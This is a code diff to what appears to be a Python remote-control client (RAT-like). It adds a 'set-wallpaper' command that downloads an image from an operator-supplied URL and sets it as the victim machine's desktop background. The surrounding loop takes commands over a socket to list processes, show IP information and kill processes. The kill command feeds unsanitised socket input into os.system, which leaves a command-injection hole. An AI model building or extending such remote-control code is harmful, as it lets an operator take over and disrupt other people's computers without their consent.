@@ -11,7 +11,20 @@ help_message = '''  ├ Help
             └ ip-info (information about client ip)
               └ pids (list of client proccesses)
                 └ kill (PID) (kill proccess by PID)
+                  └ set-wallpaper (url) (change client wallpaper)
             '''
+
+def set_wallpaper(url):
+    print(url)
+    r = requests.get(url=url)
+    name = "background_image.png"
+    file = open(name, "wb")
+    file.write(r.content)
+    file.close()
+    PATH = os.path.abspath(name)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)
+
+
 def server_control():
     try:
         while True:
@@ -52,6 +65,9 @@ def server_control():
                 print(command.split(' ')[1])
                 os.system(f"taskkill /F /PID {command.split(' ')[1]}")
                 s.send(f'  └─▷ {command.split(" ")[1]} was successfully killed'.encode())
+            elif 'set-wallpaper' in command:
+                set_wallpaper(command.split(" ")[1])
+                s.send(f'  └─▷ Background image was successfully changed'.encode())
             else:
                 s.send(f'  └─▷ Command not found!\n{help_message}'.encode())
             
